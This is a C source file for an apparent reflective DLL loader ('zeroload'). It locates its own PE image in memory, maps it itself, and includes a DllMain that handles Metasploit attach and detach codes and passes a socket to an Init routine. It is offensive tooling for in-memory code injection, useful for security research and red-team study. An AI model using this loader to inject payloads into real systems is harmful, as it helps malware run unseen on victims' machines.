#include "zeroload.h"

__declspec(noinline) LPVOID zl_start_address(VOID)
{
	return _ReturnAddress();
}

__declspec(dllexport) ULONG_PTR WINAPI ZEROLOAD_EXPORT_NAME(LPVOID lpParam)
{
	// prevent name mangling for the export, aka _zeroload@4
	// #pragma comment(linker, "/EXPORT:" __FUNCTION__ "=" __FUNCDNAME__)
	// eh, that just did a forward... todo: internal strstr? .DEF file?

	PZEROLOAD_STATE pState = NULL;
	LPBYTE lpStartAddr = zl_start_address();

	while (--lpStartAddr && !zl_valid_pe(lpStartAddr))
		continue;

	pState = zl_state_init(ZEROLOAD_REFLECT_ALL, ZEROLOAD_STOPPAGING, ZEROLOAD_MAX_DEPTH);

	// returns &DllMain
	return (ULONG_PTR)zl_load_image(pState, lpStartAddr, lpParam, 0);
}

#ifndef REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN

// you must implement this function...
extern DWORD DLLEXPORT Init(SOCKET socket);

BOOL MetasploitDllAttach(SOCKET socket)
{
	Init(socket);
	return TRUE;
}

BOOL MetasploitDllDetach(DWORD dwExitFunc)
{
	switch (dwExitFunc)
	{
	case EXITFUNC_SEH:
		SetUnhandledExceptionFilter(NULL);
		break;
	case EXITFUNC_THREAD:
		ExitThread(0);
		break;
	case EXITFUNC_PROCESS:
		ExitProcess(0);
		break;
	default:
		break;
	}

	return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
	BOOL bReturnValue = TRUE;

	switch (dwReason)
	{
	case DLL_METASPLOIT_ATTACH:
		bReturnValue = MetasploitDllAttach((SOCKET)lpReserved);
		break;
	case DLL_METASPLOIT_DETACH:
		bReturnValue = MetasploitDllDetach((DWORD)lpReserved);
		break;
	case DLL_QUERY_HMODULE:
		if (lpReserved != NULL)
			*(HMODULE *)lpReserved = hAppInstance;
		break;
	case DLL_PROCESS_ATTACH:
		hAppInstance = hinstDLL;
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}

#endif